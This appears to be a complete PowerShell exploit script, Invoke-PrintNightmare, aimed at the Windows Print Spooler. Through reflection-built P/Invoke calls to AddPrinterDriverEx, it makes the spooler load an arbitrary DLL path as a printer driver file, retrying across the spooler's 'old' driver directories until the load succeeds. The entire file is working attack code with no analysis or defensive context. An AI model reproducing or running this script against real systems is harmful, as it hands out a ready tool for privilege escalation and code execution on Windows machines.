#Requires -Version 2

$DynAssembly = New-Object System.Reflection.AssemblyName('BlueNightmareAssembly')
$AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('BlueNightmare', $False)

$TypeBuilder = $ModuleBuilder.DefineType('winsplool', 'Public, Class')

$DllImportConstructor = [System.Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
$FieldArray = [System.Reflection.FieldInfo[]] @(
	[System.Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
	[System.Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'),
	[System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'),
	[System.Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
	[System.Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
)

$PInvokeMethod = $TypeBuilder.DefineMethod(
	'AddPrinterDriverEx',
	[Reflection.MethodAttributes] 'Public, Static',
	[Bool],
	[Type[]] @([String], [UInt32], [IntPtr], [UInt32])
)

$FieldValueArray = [Object[]] @(
	'AddPrinterDriverEx',
	$true,
	$true,
	[System.Runtime.InteropServices.CallingConvention]::Winapi,
	[System.Runtime.InteropServices.CharSet]::Auto
)

$SetLastErrorCustomAttribute = New-Object System.Reflection.Emit.CustomAttributeBuilder(
	$DLLImportConstructor,
	@('winspool.drv'),
	$FieldArray,
	$FieldValueArray
)

$PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

$PInvokeMethod = $TypeBuilder.DefineMethod(
	'EnumPrinterDrivers',
	[Reflection.MethodAttributes] 'Public, Static',
	[Bool],
	[Type[]] @([String], [String], [UInt32], [IntPtr], [UInt32], [UInt32].MakeByRefType(), [UInt32].MakeByRefType())
)

$FieldValueArray = [Object[]] @(
	'EnumPrinterDrivers',
	$true,
	$true,
	[System.Runtime.InteropServices.CallingConvention]::Winapi,
	[System.Runtime.InteropServices.CharSet]::Auto
)

$SetLastErrorCustomAttribute = New-Object System.Reflection.Emit.CustomAttributeBuilder(
	$DLLImportConstructor,
	@('winspool.drv'),
	$FieldArray,
	$FieldValueArray
)

$PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

$winspool = $TypeBuilder.CreateType()

$ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructor(@([System.Runtime.InteropServices.UnmanagedType]))
$AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @([System.Runtime.InteropServices.UnmanagedType]::LPTStr))

$TypeBuilder = $ModuleBuilder.DefineType('_DRIVER_INFO_2', 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit', [System.ValueType], [Reflection.Emit.PackingSize]::Unspecified)

$null = $TypeBuilder.DefineField('cVersion', [UInt32], 'Public')

$newField = $TypeBuilder.DefineField('pName', [String], 'Public')
$newField.SetCustomAttribute($AttribBuilder)

$newField = $TypeBuilder.DefineField('pEnvironment', [String], 'Public')
$newField.SetCustomAttribute($AttribBuilder)

$newField = $TypeBuilder.DefineField('pDriverPath', [String], 'Public')
$newField.SetCustomAttribute($AttribBuilder)

$newField = $TypeBuilder.DefineField('pDataFile', [String], 'Public')
$newField.SetCustomAttribute($AttribBuilder)

$newField = $TypeBuilder.DefineField('pConfigFile', [String], 'Public')
$newField.SetCustomAttribute($AttribBuilder)


$DRIVER_INFO_2 = $TypeBuilder.CreateType()

function Invoke-PrintNightmare {

<#

#>

    [OutputType([Bool])]
    [CmdletBinding()]
    param (
        
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, Position=0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path
    )

    function getDrivers {
        
        $returnValue = $false
        $cReturned = $cbNeeded = [UInt32]0
        
        if ($winspool::EnumPrinterDrivers([String]::Empty, "Windows x64", 2, [IntPtr]::Zero, 0, [ref]$cbNeeded, [ref]$cReturned)) {

                Write-Verbose "[Invoke-PrintNightmare] getDrivers: EnumPrinters should fail!"
                $returnValue = $false
        } else {

            if ( ($LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()) -ne 122) {
                
                Write-Verbose "[Invoke-PrintNightmare] getDrivers: $(([System.ComponentModel.Win32Exception]$LastError).Message) $LastError"
                $returnValue = $false
            } else {

                $pAddr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($cbNeeded -as [Int])

                if ($winspool::EnumPrinterDrivers([String]::Empty, "Windows x64", 2, $pAddr, $cbNeeded, [ref]$cbNeeded, [ref]$cReturned)) {
                    
                    $returnValue = [System.Runtime.InteropServices.Marshal]::PtrToStructure($pAddr, [Type]$DRIVER_INFO_2)

                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAddr)
                } else {

                    Write-Verbose "[Invoke-PrintNightmare] getDrivers: $(([System.ComponentModel.Win32Exception] ([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())).Message)"
                    $returnValue = $false
                }
            }
        }

        return $returnValue
    }

    function addPrinter ([string]$Path) {
        
        $drivers = getDrivers
        $pDriverPath = [System.IO.Directory]::GetParent($drivers[0].pDriverPath).FullName + "\\UNIDRV.DLL"

        Write-Verbose "[Invoke-PrintNightmare] addPrinter: pDriverPath found $pDriverPath"
        Write-Verbose "[Invoke-PrintNightmare] addPrinter: Executing $Path"

        $level2 = New-Object $DRIVER_INFO_2
        $level2.cVersion = 3
        $level2.pConfigFile = "C:\Windows\System32\kernelbase.dll"
        $level2.pDataFile = $Path
        $level2.pDriverPath = $pDriverPath
        $level2.pEnvironment = "Windows x64"
        $level2.pName = "12345"

        $filename = [System.IO.Path]::GetFileName($Path)
        $flags = 0x00000004 -bor 0x10 -bor 0x8000

        $pnt = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf((New-Object $DRIVER_INFO_2)))
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($level2, $pnt, $false)

        $winspool::AddPrinterDriverEx([String]::Empty, 2, $pnt, $flags)

        Write-Verbose "[Invoke-PrintNightmare] addPrinter: Stage 0 $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pnt)

        foreach ($i in 1..30) {

            $level2.pConfigFile = "C:\Windows\System32\spool\drivers\x64\3\old\$i\$filename"
            $pnt2 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf((New-Object $DRIVER_INFO_2)))
            
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($level2, $pnt2, $false)

            $winspool::AddPrinterDriverEx([String]::Empty, 2, $pnt2, $flags)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pnt2)

            if ($LastError -eq 0) {

                Write-Verbose "[Invoke-PrintNightmare] addPrinter: Stage $i $($LastError.ToString())"
                $returnValue = $true
                break
            } else {

                $returnValue = $false
            }
        }

        return $returnValue
    }
    
    PROCESS {
        
        if (Test-Path $Path) {

            foreach ($i in 1..3) {

                Write-Verbose "[Invoke-PrintNightmare] Try $i"
                $returnValue = addPrinter $Path

                if ($returnValue) {

                    Write-Verbose "[Invoke-PrintNightmare] Exploit completed"
                    break
                }
            }
        } else {

            Write-Verbose "[Invoke-PrintNightmare] Invalid path provided"
            $returnValue = $false
        }
    }
    
    end {
        
        return $returnValue
    }
}
